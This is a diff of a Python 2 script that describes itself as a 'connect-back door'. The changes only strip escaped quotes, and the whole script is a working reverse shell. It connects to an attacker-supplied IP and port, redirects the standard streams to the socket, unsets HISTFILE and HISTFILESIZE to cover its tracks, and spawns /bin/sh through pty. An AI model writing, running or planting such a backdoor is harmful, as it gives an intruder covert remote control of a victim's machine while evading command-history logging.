@@ -4,11 +4,11 @@ import os
 import socket
 import pty
 
-shell = \"/bin/sh\"
+shell = "/bin/sh"
 
 def usage(programname):
-        print \"python connect-back door\"
-        print \"Usage: %s <conn_back_ip> <port>\" % programname
+        print "python connect-back door"
+        print "Usage: %s <conn_back_ip> <port>" % programname
 
 def main():
         if len(sys.argv) != 3:
@@ -19,19 +19,19 @@ def main():
 
         try:
                 s.connect((socket.gethostbyname(sys.argv[1]),int(sys.argv[2])))
-                print \"[+]Connect OK.\"
+                print "[+]Connect OK."
         except:
-                print \"[-]Can't connect\"
+                print "[-]Can't connect"
                 sys.exit(2)
 
         os.dup2(s.fileno(),0)
         os.dup2(s.fileno(),1)
         os.dup2(s.fileno(),2)
         global shell
-        os.unsetenv(\"HISTFILE\")
-        os.unsetenv(\"HISTFILESIZE\")
+        os.unsetenv("HISTFILE")
+        os.unsetenv("HISTFILESIZE")
         pty.spawn(shell)
         s.close()
 
-if __name__ == \"__main__\":
+if __name__ == "__main__":
         main()
